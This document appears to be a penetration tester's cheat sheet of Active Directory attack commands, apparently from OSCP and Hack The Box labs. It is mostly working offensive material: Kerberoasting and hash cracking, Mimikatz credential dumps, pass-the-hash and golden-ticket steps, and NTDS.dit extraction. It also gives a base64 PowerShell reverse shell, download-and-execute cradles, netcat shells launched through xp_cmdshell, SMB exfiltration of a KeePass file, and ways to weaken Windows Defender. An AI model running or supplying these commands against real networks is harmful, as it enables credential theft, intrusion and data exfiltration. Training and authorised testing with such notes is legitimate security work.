Managed service accounts mitigate this risk, due to the complexity of their passwords, but they are not in active use in many environments. It is worth noting that shutting down the server hosting the service doesn’t mitigate, as the attack doesn’t involve communication with the target service. It is therefore important to regularly audit the purpose and privilege of all enabled accounts.
Kerberos authentication uses Service Principal Names (SPNs) to identify the account associated with a particular service instance. `ldapsearch` can be used to identify accounts that are configured with SPNs. 

```
# Kerberoasting from a windows machine
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast                                                                          # Kerberoasting from windows - with a comprimised user on a host we can try getting the TGS-REP   



# kerberos from a Linux machine 
sudo impacket-GetUserSPNs -request -dc-ip 192.168.179.70 -outputfile output.hashes corp.com/pete                             # Kerberoasting from Linux - attack against a TGS for an SPN with obtained . We will need a users credentials as we are not on the the doamin. Always best to set the output file to avoid messing the hash
hashcat --help | grep -i "Kerberos"                                                                                         # Kerberoasting - hashcat mode for TGS-REP hashes is 13100 
sudo hashcat -m 13100 hashes.KERBeroast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force    # Kerberoasting - hashcat mode for TGS-REP hashes is 13100 
john hashes-new.txt --format=krb5tgs --wordlist=/usr/share/wordlists/rockyou.txt                                            # Kerberoasting attack  - Cracking the hash with John is fast
```

If `impacket-GetUserSPNs` throws the error "KRB_AP_ERR_SKEW(Clock skew too great)," we need to synchronize the time of the Kali machine with the domain controller. We can use `sudo ntpdate <DC-IPADDRESS>`


```
sudo apt-get install ntpsec-ntpdate             # Clock Skew fix
sudo ntpdate <Ip_OF_MACHINE_TO_SYNC_WITH>       # Clock Skew fix   
```

```
# Targeted Kerberoasting 
setspn -D HTTP/pete.corp.com corp\pete   # Natve Targets kerberoasting  with setspn - IF you have permissive ACE on a user then you could add an SN to their account to do Targeted Kerberoasting on the TGS
Set-ADUser -Identity "pete" -Add @{ServicePrincipalName="HTTP/pete.corp.com"}    # PS Targets kerberoasting - IF you have permissive ACE on a user then you could add an SN to their account to do Targeted Kerberoasting on the TGS
```


Tool for Targeted Kerberoasting - https://github.com/ShutdownRepo/targetedKerberoast
```
python3 targetetedkerberoast.py -v -d administartor.htb -u '<CONTROLLED_USERNAME>' -p 'PASSWORD'        # Targeted Kerberoast - (Can get a clock Skew error - fix in notes) 
```

#### Kerbeoasting with Invoke-Kerberoas.ps1 on a compromised admin on a related machine  
```
/usr/share/powershell-empire/empire/server/data/module_source/credentials/Invoke-Kerberoast.ps1                                        # Kerbeoasting - get this onto the compromised admin acc on machine to get the tgs
PS> Invoke-Kerberoast -OutputFormat Hashcat | select-Object Hash | Out-File -filepath 'c:\users\public\HashCapture.txt' -Width 8000    # Kerbeoasting - Get this onto the machine . 8000 keeps it all on one line
```
Once we have the hashCaptuire we can investigate the hash type and then crack it locally for Kerbeoasting
```
john hashes-new.txt --format=krb5tgs --wordlist=/usr/share/wordlists/rockyou.txt            # Kerbeoasting - Cracking with John
hashcat -m 13100 -o CrackedHash.txt -a 0 HashCapture.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force  --show -O HASHCAT-OUTPUT.txt  # Kerbeoasting - Cracking , but this command could be simpler and was a bit unreliable 
```

```sh
ldapsearch -x -H 'ldap://10.10.10.100' -D 'SVC_TGS' -w 'GPPstillStandingStrong2k18' -b "dc=active,dc=htb" -s sub "(&(objectCategory=person)(objectClass=user)(!(useraccountcontrol:1.2.840.113556.1.4.803:=2))(serviceprincipalname=*/*))" serviceprincipalname | grep -B 1 servicePrincipalName 

dn:  N=Administrator,CN=Users,DC=active,DC=htb 
servicePrincipalName: active/CIFS:445
```
- `ldapsearch -H "ldap://10.129.215.226" -x -s base namingcontexts`
- `ldapsearch -H "ldap://10.129.215.226" -x -b 'DC=cascade,DC=local' > tmp`
- `cat tmp | awk '{print $1}' | sort | uniq -c | sort -nr | grep : ` this will give us all the unique values 
This was interesting : "cascadeLegacyPwd: clk0bjVldmE=" -> base64 -d == "rY4n5eva" ???

**Bruteforce password sparay**
- `kerbrute passwordspray -dc <IP_ADDRESS> -d <DOMAIN_NAME> <USERNAME_FILE> <PASSWORD_TO_TRY>`          # Kerberos password spraying 
- `kerbrute passwordspray -dc 10.10.10.10 -d bbc.com /UserNameFile.txt PAssw0rd!`                       # Kerberos password spraying 
- `kerbrute.exe passwordspray .\usernames.txt "Tuesday@2" -d corm.com`                               # Kerberos password spraying 
- Verify with crackmapexec 
  - `crackmapexec smb 10.10.10.10 -u TheBoss -p 'Passw0rd!`


```
K:> kerbrute userenum -d <DOMAIN> --dc <DC_IPADDRESS> jsmith.txt -o valid_ad_users                          # kerbrute - username enumeration
```

##### Local Spraying from a Windows machine
This tool - https://github.com/dafthack/DomainPasswordSpray - from the HTB module on Attackign AD

```
PS C:\htb> Import-Module .\DomainPasswordSpray.ps1
PS C:\htb> Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
```



### Mimikatz
- [Wiki](https://github.com/gentilkiwi/mimikatz/wiki)
- [Code](https://github.com/gentilkiwi/mimikatz)
- [Missing manual](https://github.com/darkoperator/mimikatz-missing-manual?tab=readme-ov-file) 

Requires Administrator Privs.
Modules help can be access by typing just `::` at the end of their name. Modules are:

```sh
standard                           # mimikatz - all commands get help by typing ::
privilege                          # mimikatz - all commands get help by typing ::
crypto                             # mimikatz - all commands get help by typing ::
sekurlsa                           # mimikatz - all commands get help by typing ::
kerberos                           # mimikatz - all commands get help by typing ::
lsadump                            # mimikatz - all commands get help by typing ::   eg; vault::
vault                              # mimikatz - all commands get help by typing ::
token                              # mimikatz - all commands get help by typing ::
event                              # mimikatz - all commands get help by typing ::
ts                                 # mimikatz - all commands get help by typing ::
process                            # mimikatz - all commands get help by typing ::
service                            # mimikatz - all commands get help by typing ::
net                                # mimikatz - all commands get help by typing ::
misc                               # mimikatz - all commands get help by typing ::
library                            # mimikatz - all commands get help by typing ::  mimili
driver                             # mimikatz - all commands get help by typing ::  mimidr


privilege::debug                   # mimikatz - Grab everything (maybe)
sekurlsa::logonpasswords lsadump::sam lsadump::secrets lsadump::cache         # Grab everything (maybe)
```

**Get Local Users NTLM hash (work flow - Assumeing Mimikatz is on the machine and you have Administrator rights)** 
- Run powershell as the Administrator
- Start mimikatz `.\mimikatz.exe`
- `privilege::debug` engage the [_SeDebugPrivlege_](https://msdn.microsoft.com/en-us/library/windows/desktop/bb530716(v=vs.85).aspx) privilege, which will allow us to interact with a process owned by another account.
- `token::elevate` elevate to SYSTEM user. 
- `sekurlsa::logonpasswords`- to dump the credentials hashes of all logged-on users with the [_Sekurlsa_ module](https://github.com/gentilkiwi/mimikatz/wiki/module-~-sekurlsa)
- `sekurlsa::tickets`
- `lsadump::sam` we will dump the hash

`PS C:\Users\hacker\Desktop> .\mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::sam" "exit" > MimiDump.txt`


#### Mimikatz with Kerberos and ADCS
- `sekurlsa::tickets` - show the tickets that are stored in memory , nice to do after reading a smb share to get TGT as part of the interaction
- `crypto::capi` - Will patch/modify the Windows' CryptoAPI to bypass protections and extract sensitive cryptographic material.
- `crypto::cng` modify `KeyIso` service, in **LSASS** process, in order to make unexportable keys, exportable. Only useful when keys provider is Microsoft Software Key Storage Provider.

Back on your cracker
- `echo 2835573fb334e3696ef62a00e5cf7571 > victim.hash`
- `hashcat -m 1000 victim.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force`

##### Powershell version of mimikatz to Dump Hashes etc  
```
IEX (New-Object Net.Webclient).downloadstring("http://192.168.179.160/Invoke-Mimikatz.ps1")

# Invoke-Mimikatz needs to be run as admin. In the UI this is running PS as admin. If this is on the cli/Reveres shell, you will need to bypass UAC. The command placed in single quotes and each sub command placed in double quotes , Defender may also shut it down after running so its best to save the out put to a file

Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::sam" "exit"' > MimiDump.txt
```

**winrm** 
```sh
┌──(kali㉿kali)-[~/…/Machines/AUTHORITY/Certipy/certipy]
└─$ crackmapexec winrm -u 'svc_ldap' -p 'lDaP_1n_th3_cle4r!' -dc-ip 10.129.218.144 -x 'type C:\USers\Administrator\Desktop\root.txt'
HTTP        10.129.218.144  5985   10.129.218.144   [*] http://10.129.218.144:5985/wsman
WINRM       10.129.218.144  5985   10.129.218.144   [+] c-ip\svc_ldap:lDaP_1n_th3_cle4r! (Pwn3d!)
WINRM       10.129.218.144  5985   10.129.218.144   [+] Executed command
WINRM       10.129.218.144  5985   10.129.218.144   e9a1b0f28db8d8eab9c0ab064bf2f8e5
```

## Lateral movment in Active Directory

Note: Intresting site: https://www.thehacker.recipes/ad/movement/credentials/dumping/dcsync many active directory attacks

WMI and WinRM Snippets below permit lateral movement from a foothold and another users credntials to launch the reverse shell as another user on target resources they have have access to
```sh
PS:> New-PSSession                                                                                  # Windows lateral movement - via WinRM in powereshell (see AD-LAt mvmnt notes)
PS:> New-CimSession                                                                                 # Windows lateral movement - via wmic in powereshell (see AD-LAt mvmnt notes)
C:> winrs -r:files04 -u:jen -p:Nexus123! "powershell -nop -w hidden -e BLAH64...."                  # Windows lateral movement - via WinRM in powereshell (see AD-LAt mvmnt notes)
C:> winrs -r:<TARGET_HOSTNAME> -u:jen -p:Nexus123! "powershell -nop -w hidden -e BLAH64...."        # Windows lateral movement - via WinRM in powereshell (see AD-LAt mvmnt notes)
wmic /node:192.168.179.73 /user:jen /password:Nexus123! process call create "powershell ...BLAH..."  # Windows lateral movement - via WinRM in powereshell (see AD-LAt mvmnt notes)
wmic /node:<IP_ADDRESS> /user:jen /password:Nexus123! process call create "<CMD_TO_RUN>"            # Windows lateral movement - via WinRM in powereshell (see AD-LAt mvmnt notes)
```
The below powershell script is an example of useing the powershell implementation of wmic for lateral movment via WinRM in powereshell.
```powershell
$username = 'jen';                                                                                              # Windows lateral movement - Powershell script to lauch a shell on another machine with wmi if we have creds  
$password = 'Nexus123!';                                                                                        # Windows lateral movement - Powershell script to lauch a shell on another machine with wmi if we have creds  
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;                                           # Windows lateral movement - Powershell script to lauch a shell on another machine with wmi if we have creds  
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;                    # Windows lateral movement - Powershell script to lauch a shell on another machine with wmi if we have creds  -- See in browser
$options = New-CimSessionOption -Protocol DCOM                                                                  # Windows lateral movement - Powershell script to lauch a shell on another machine with wmi if we have creds  
$session = New-Cimsession -ComputerName <IP_ADDRESS> -Credential $credential -SessionOption $Options            # Windows lateral movement - Powershell script to lauch a shell on another machine with wmi if we have creds  
$command = 'powershell -nop -w hidden -e                                                                                        JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADIAMAAxACIALAA0ADQAMwApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA=';   # Windows lateral movement - Powershell script to lauch a shell on another machine with wmi if we have creds
Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command}; # Windows lateral movement - Powershell script to lauch a shell on another machine with wmi if we have creds
```

#### Pass the hash (PtH)
Pass the hash is useing the hash to login rather than the password. Pth requires an SMB through the firewall (commonly port 445), Windows File and Printer Sharing feature to be enabled ( normally a default) and admin share called **ADMIN$** to be available. 

```
impacket-wmiexec -hashes :<NTLM-HASH> <USERNAME>@<IP_ADDRESS>                                        # Pass the hash example - if we only have a hash maybe we can pass it to login
impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@192.168.179.73               # Pass the hash example - if we only have a hash maybe we can pass it to login
```
Other tools which can pass the has hare Mimikatz, nxc, netexec, Powersploi

#### Overpass the hash
[_overpass the hash_](https://www.blackhat.com/docs/us-14/materials/us-14-Duckwall-Abusing-Microsoft-Kerberos-Sorry-You-Guys-Don't-Get-It-wp.pdf), goes "over" or beyond abuse NTLM to gain a full Kerberos [_Ticket Granting Ticket_](https://learn.microsoft.com/en-us/windows/win32/secauthn/ticket-granting-tickets) (TGT).

```
mimikatz # privilege::debug                   # Overpass the hash 
mimikatz # sekurlsa::logonpasswords           # Overpass the hash - Obtain all the hashes
mimikatz # sekurlsa::pth /user:<VICTIM> /domain:<DOMAIN> /ntlm:<NTLM-HASH>> /run:<UTILITY-TO-RUN>    # Overpass the hash - comand template
mimikatz # sekurlsa::pth /user:jen /domain:corp.com /ntlm:369def79d8372408bf6e93364cc93075 /run:powershell    # Overpass the hash - spawns powershell as Jen but will appaear in the context of the original user jeff
PS:> klist                                    # Overpass the hash - Notice no tickets are stored yet  
PS:> net use \\files04                        # Overpass the hash - Makes an interactice request as jen to login and cache the TGT
PS:> klist                                    # Overpass the hash - Now see some tickets are stored 
PS:> .\PsExec.exe \\<TARGET-HOSTNAME> cmd     # Overpass the hash - run a new shell with a utility that uses kerberos tickets and not NTLM

# Overpass the hash - with Invoke-Mimikatz
PS:> Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::pth /user:hannah /domain:offsec.live /ntlm:a29f7623fd11550def0192de9246f46b /run:powershell.exe" "exit"'  # Overpass the hash - with Invoke-Mimikatz , if we can get it on the machine as the Admin. Request a Kerb Ticket from the DC and launch a new powershell but any coms by the process will be run as the compromised user Hannah.
```

#### Pass the Ticket 
Pass the ticket is about reusing tickets; within the scope of the specific services the ticket is permitted for. 
```
PS C:\Tools> klist                                            # See no local tickets - Pass the ticket 
mimikatz # privilege::debug
mimikatz # sekurlsa::tickets /export                          # Pass the ticket - export / dump all the tickets as KRIBI files in the pwd
mimikatz # kerberos::ptt [0;12bd0]<<<SOME-TICKET>>>.kirbi     # Pass the ticket 
PS C:\Tools> klist                                            # Pass the ticket - list our new local ticket
PS C:\Tools> ls \\web04\backup                                # Pass the ticket- access the resource
```

#### [MMC20 DCOM Lateral Movement](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)
 The [_Microsoft Management Console_](https://docs.microsoft.com/en-us/previous-versions/windows/desktop/mmc/microsoft-management-console-start-page) (MMC) COM application allows the creation of [Application Objects](https://docs.microsoft.com/en-us/previous-versions/windows/desktop/mmc/application-object?redirectedfrom=MSDN). These expose the _[**ExecuteShellCommand**](https://docs.microsoft.com/en-us/previous-versions/windows/desktop/mmc/view-executeshellcommand)_ method under the _`Document.ActiveView`_ property. This allows the execution of any shell command as long as the authenticated user is authorized. The method accepts four parameters: **Command**, **Directory**, **Parameters**, and **WindowState**. We're only interested in the first and third/

DCOM exploit command structure:
```
PS:> $dcom =[System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","<IP_ADDRESS>")                                      # DCOM Lateral movment - Create our DCOM application object    
PS:> $dcom.Document.ActiveView.ExecuteShellCommand("<BINARY_TO_RUN_NAME>,$null,"<CLI_COMMAND_TO_BE_RUN>","<windows_State>")                        # DCOM Lateral movment - Run our command to 
C:\ tasklist | findstr "<UTILITY>"                # Look for started payload for verification on the target                         
```

Reverse Shell DCOM exploit command example:
```
Kali: nc -lvnp 443
PS:> $dcom =[System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","<IP_ADDRESS>")                                       # DCOM Lateral movment - Create our DCOM application object    
PS:> $dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"powershell -nop -w hidden -e JABjAGwAaQBlAG....BLAH","7")                    # DCOM Lateral movment - Run our command to launch the reverse shell
```

#### Golden Tickets
[_Golden tickets_](https://www.blackhat.com/docs/us-14/materials/us-14-Duckwall-Abusing-Microsoft-Kerberos-Sorry-You-Guys-Don%27t-Get-It.pdf). : If we get Local Admin and we can get our hands on the _krbtgt_ password hash, we can create our own self-made custom TGTs (aka Golden Tickets). Obtaining the NTLM hash of the _krbtgt_ user, we can issue domain-administrative TGTs (Golden Tickets) to any existing low-privileged account, Allowing us inconspicuous legitimate access to the entire AD domain.

```
C:\Tools\SysinternalsSuite>PsExec64.exe \\DC1 cmd.exe                                                           # Golden Tickets - See the connection to a DC is currently denied. Expected.
mimikatz # privilege::debug 
mimikatz # lsadump::lsa /patch                                                                                  # Golden Tickets - dump all hashes inc the krbtgt and the DC SID
mimikatz # kerberos::purge                                                                                      # Golden Tickets - Clear out all existing tickets to be sure
mimikatz # kerberos::golden /user:jen /domain:corp.com /sid:<SID-VALUE>> /krbtgt:<KRBTGT-NTLM-HASH>7 /ptt       # Golden Tickets - mimikatz comand template to make a golde ticket
mimikatz # misc::cmd                                                                                            # Golden Tickets - With the ticket in memory, launch a new shell though mimikatz
C:\Tools\SysinternalsSuite>PsExec.exe \\dc1 cmd.exe                                                             # Golden Tickets - try accessing the resource (DC) with PSexec
```

####  Shadow copy Persistance Technique
As domain admins, we can abuse the [vshadow](https://learn.microsoft.com/en-us/windows/win32/vss/vshadow-tool-and-sample) utility to create a [Shadow Copy](https://en.wikipedia.org/wiki/Shadow_Copy) that will allow us to extract the Active Directory Database [**NTDS.dit**](https://technet.microsoft.com/en-us/library/cc961761.aspx) database file. Once we've obtained a copy of the database, we need the [SYSTEM hive](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-hives), and then we can extract every user credential offline on our local Kali machine. Note: Could only get the copy of the whole AD Database from the shadow copy on CMD not powershell???
```
PS:> Get-ChildItem -Path C:\Tools -Filter "vshadow.exe"                                   # Shadow Copy - (PS DID NOT WORK FOR SHADOW) Search for the binary with powershell

C:> dir C:\vshadow.exe /s                                                                 # Shadow Copy - Search for the vshadow binary with cmd in the entire FS
C:\Tools>vshadow.exe -nw -p  C:                                                           # Shadow Copy - make a snapshot and obtain the name of shadow copy device  
C:\Tools>copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit c:\ntds.dit.bak      # Shadow Copy - Make a copy of the Ad database, providing a full path to the device
C:\>reg.exe save hklm\system c:\system.bak                                                               # Shadow Copy - makea copy of the system hive inorder to extract teh ad data base 
K:$> impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL                                    # Shadow Copy -  with the AD db and hive on Kali, extract all the Key MAT.
```

### ssh brute 
- `cme ssh <IPADDRESS> -u user.txt -p Passwd.txt`
- `ncrack 192.168.179.39 -U users.txt -P passwords.txt -p ssh -f -v`  

**MSSQL**

```
cms mssql 10.10.11.202 -u "PublicUser" -p 'GuestUserCantWrite1'                           # If this doesnt work ...
cms mssql 10.10.11.202 --local-auth -u "PublicUser" -p 'GuestUserCantWrite1'              # ....this might work.

cms mssql 10.10.11.202 --local-auth -u "PublicUser" -p 'GuestUserCantWrite1' -L            # -L will list the availible modules
cms mssql 10.10.11.202 --local-auth -u "PublicUser" -p 'GuestUserCantWrite1' -M mssql_priv #   This will show us what privs we have 
```


```
SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'
```


## Impacket

https://github.com/fortra/impacket

```sh
GetADUsers.py -all -dc-ip <IP_ADDRESS> <DOMAIN>/<USERNAME>:<PASSWORD> # simplifies the process of enumerating domain user accounts.
GetUserSPNs.py active.htb/svc_tgs -dc-ip 10.10.10.100  #  lets us request the TGS and extract the hash for offline cracking.
wmiexec.py active.htb/administrator:Ticketmaster1968@10.10.10.100 # can be used to get a shell as active\administrator , and read root.txt .
```

```
impacket-smbserver testers 'pwd'   # SMB local share will create an smb server eg "\\<MY_IP_ADDRESS>\testers - shareing the pwd ( i think)

or 

sudo impacket-smbserver share ./
```

SMB local share for Share 

```
impacket-smbserver share /home/kali/OSCP/12WP/ -smb2support    # SMB local share
```

Then in the Windows machine open the Computer explorer and put hte share details of your kali IP in the search `\\192.168.179.177`

#### most basic smbserver from kali
```
impacket-smbserver share $(pwd) -smb2support          # smb server - most basic smbserver from kali
```


#### Powershell launch 
`python3 psexec.py administrator@{<IP_ADDRESS>}`

#### Impacket launch for sql shell
- `python3 mssqlclient.py ARCHETYPE/sql_svc@10.129.58.104 -windows-auth`
- `mssqlclient.py USERNAME:PASSWORD@DIMAINNAME-OR-IP`
IF we then launch a locla responder with 
- `reponder -I tun0`
And then call to my responder fro mthe mssql wwe can get the sql service credential
- `)> xp_dirtree \\HACKER_IP\fake\share` - we do two things so it has a file to read
We get het Hash which we can then crack with hashcat.

We can read Responder collections files at: /usr/share/responder/logs 


```
K:> impacket-mssqlclient -windows-auth Emma@192.168.179.248 -port 49965               # ms sql connection via imapacket  example fro mOSCP Challenge labs - Relia - This cgave me a remote interface to the db
K:> impacket-mssqlclient sql_svc:Dolphin1@10.10.73.148 -windows-auth                  # mssql auth example from OSCP - B ad set
```

#### impacket-mssqlclient auth
- `impacket-mssqlclient auth with:`         `-k`: Use Kerberos tickets (SSPI), SPN-based authentication.
- `impacket-mssqlclient auth with:`         `-windows-auth`: Use NTLM/SSPI with Windows credentials.
- `impacket-mssqlclient auth with neither:` SQL authentication with SQL logins (e.g., sa).


#### Impacket SQL shell cmds
```sh
SQL> select system_user;                # Who are we? sa ( service account) , some user @ DOMAIN ??
SQL> EXEC xp_dirtree '\\192.168.45.199\share';
SQL> xp_cmdshell "powershell -c pwd"
SQL> xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget http://10.10.14.9/nc64.exe -outfile nc64.exe"
SQL> xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; .\nc64.exe -e cmd.exe 10.10.14.9 443"
```
#### ticketer
```
impacket-ticketer -debug -nthash <HASH_DATA> -domain-sid <DOMAIN_SID>> -domain DOMAIN.htb -spn <USERNAME/DC.DOMAIN.htb>
```
##### Make an Enterprise Admin credential with impacket-ticketer
```
impacket-ticketer -aesKey <KDC-AES_KEY> -domain-sid <IMPOSTERS-DOMAIN-SID> -domain <DOMAIN-of-IMPOSTER> -extra-pac -extra-sid <EA-SID-VALUE> <IMPOSTER-USERNAME>
```

```
impacket-ticketer -aesKey b2304e451b53dc5e71c08ddd0fd06a3803d8f14243020fd46c80ad44ec75d2a2 -domain-sid S-1-5-21-4168247447-1722543658-2110108262 -domain sub.poseidon.yzx -extra-pac -extra-sid S-1-5-21-1190331060-1711709193-932631991-519 administrator
```

```
export KRB5CCNAME=$(pwd)/IMPOSTER.ccache
```

## Evil-winrm

Gets shell with creds - TODO research

```
└─# evil-winrm -i 10.129.12.109 -u s.smith -p sT333ve2
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\s.smith\Documents> whoami
cascade\s.smith
*Evil-WinRM* PS C:\Users\s.smith\Documents> dir
*Evil-WinRM* PS C:\Users\s.smith\Documents> cd ../Desktop
*Evil-WinRM* PS C:\Users\s.smith\Desktop> dir


    Directory: C:\Users\s.smith\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        1/16/2024   7:51 PM             34 user.txt
-a----         2/4/2021   4:24 PM           1031 WinDirStat.lnk
```


#### Upload/download tools 

```
*Evil-WinRM* PS C:\Users\ryan\Documents> upload <HOST_MACHINE_LOCAL_TOOL/FILE>
*Evil-WinRM* PS C:\Users\ryan\Documents> download <TARGET_MACHINE_LOCAL_TOOL/FILE>
```

#### cert based login (needs to be verified)
```
evil-winrm -S -c key.cert -k key.pem -i <DOMAINNAME>                                       # evil-winrm  - "-S" for ssl
```

#### Hash based login
```
K:> evil-winrm -i sequel.htb -u administrator -H 'a52f78e4c751e5f5e17e1e9f3e58f4ee'                 # evil-winrm Hash based login       
K:> evil-winrm -i 10.10.80.142 -u celia.almeda -H 'e728ecbadfb02f51ce8eed753f3ff3fd'                # evil-winrm Hash based login - OSCP A
K:> proxychains -q evil-winrm -i 10.10.73.146 -u tom_admin -H '4979d69d4ca66955c075c41cf45f24dc'    # evil-winrm Hash based login - OSCP B
```


## exfil download data from a machine
1. Create the local smbserver
```
impacket-smbserver share /tmp/exfil -smb2support -username bob -password secret           # exfil download data from a Victim -    1. Create the local smbserver
```
2. AuthN the server with the Victim machine
```
C:\Users\jim\Documents>net use Z: \\192.168.179.236\share /user:bob secret                 # exfil download data from a Victim -    2. AuthN the server with the Victim machine
```

3. Transfer the files to the smbserver
```
C:\Usecopy C:\Users\jim\Documents\Database.kdbx \\192.168.179.236\share\Database.kdbx      # exfil download data from a Victim -    3. Transfer the files to the smbserver
```

#### exfil with smb share or RFI endpoint
We could exfil data via our smb share or make RFI endpoint top serve up something which the victim might run like a php reverse shell
```
impacket-smbserver -smb2support nasty $(pwd)                                           exfil with smb share or RFI endpoint - 1. Create an attack side share
```

```
http: GET /blog/?lang=\\10.10.14.42\nasty\reverse-shell.php HTTP/1.1                  # exfil with smb share or RFI endpoint - 2. could RFI to our share to run dodgy code from there
```
We could also copy from a windows victim  to our server 
```
C:\Docs>copy SuperImportant.txt \\10.10.10.10\nasty\SuperImportant.txt                # exfil with smb share or RFI endpoint - 3. copy data accross to the attacker
```
of copy to our attack machine from the victom 
```
C:\Docs>copy \\10.10.10.10\nasty\SuperImportant.txt SuperImportant.txt                # exfil with smb share or RFI endpoint - 4. copy data from the attacker
```



### Windows Misc

### Windows commands
```
(iwr -UseDefaultCredentials http://google.com).Content  #  download the source code of a webpage
PS:> move FILE.exe FILE-BAK.exe    # move files windows

C:>  forfiles /S /M *.txt /D -0 /C "cmd /c if @fsize GTR 1024 echo @path" 2>nul     # on windowws find text files which are greater than 1024 bytes . seperate files typoes need commands to be combined  
PS:> Get-ChildItem -Path . -Recurse -Include *.txt, *.pdf -ErrorAction SilentlyContinue | Where-Object { $_.Length -gt 100 } | Select-Object FullName        # look for txt and pdfs on windows which are greater than 100 mb

C:> forfiles /S /M *.* /D -1 /C "cmd /c echo @path" 2>nul     # look for files on windows which have been modified in the last 24 hours  
PS:> Get-ChildItem -Path . -Recurse -ErrorAction SilentlyContinue | Where-Object { $_.LastWriteTime -gt (Get-Date).AddMinutes(-10) } | Select-Object FullName   # look for files on windows which have been modified in the last 10 minutes
PS:> Get-ChildItem -Path . -Recurse -ErrorAction SilentlyContinue | Where-Object { $_.LastWriteTime -gt (Get-Date).AddHours(-24) } | Select-Object FullName  # look for files on windows which have been modified in the last 24 hours

C:> forfiles /S /M *.* /D 0 /C "cmd /c echo @path" 2>nul     # look for files on windows which have been modified in the last 24 hours ( nothing )  
PS:> Get-ChildItem -Path . -Recurse -ErrorAction SilentlyContinue | Where-Object { $_.LastAccessTime -gt (Get-Date).AddMinutes(-10) } | Select-Object FullName  # look for files on windows which have been run in the last 10 mins

```



#### Calling a nishang reverese shell
  - `powershell "IEX(New-Object Net.Web.Client).downloadString('http://SERVER_IP:PORT/shell.ps1')"` - Grab your Reverse shell with Powershell 
#### Run rev shell on powershell from encoded input
- `cat <PAYLOAD_FILE> | iconv -t UTF-16LE | base64 -w0 | xclip -selection clipboard` # copy everything to UTF-16LE which is how WIndows has files formatted . See HTB NetMon - Upload trouble with ps1 payload (Below)
- `powershell -enc <ENCODED_FILEDATA>`

### Windows Antivirus
Disable sample sending on windos Defender via the powershell command
- `Set-MpPreference -SubmitSamplesConsent 2` 
Mp == Malware Protection, 2 == Never send
Or in the UI by navigating to _Windows Security_ > _Virus & threat protection_ > _Manage Settings_ and deselecting the option.


**Alt Antivirus evasion**



Disable Anti Virus by eraseing all the Windows Defender signatures then run PsExec64 - # Alt Antivirus evasion
```
